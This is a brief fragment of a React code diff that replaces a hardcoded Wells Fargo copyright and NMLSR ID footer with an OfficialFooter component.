-            <p className="text-xs text-gray-500">© 2024 Wells Fargo. NMLSR ID 399801</p>
-          </div>
-        </div>
-      </footer>
+      <OfficialFooter />
     </div>
   );
 }
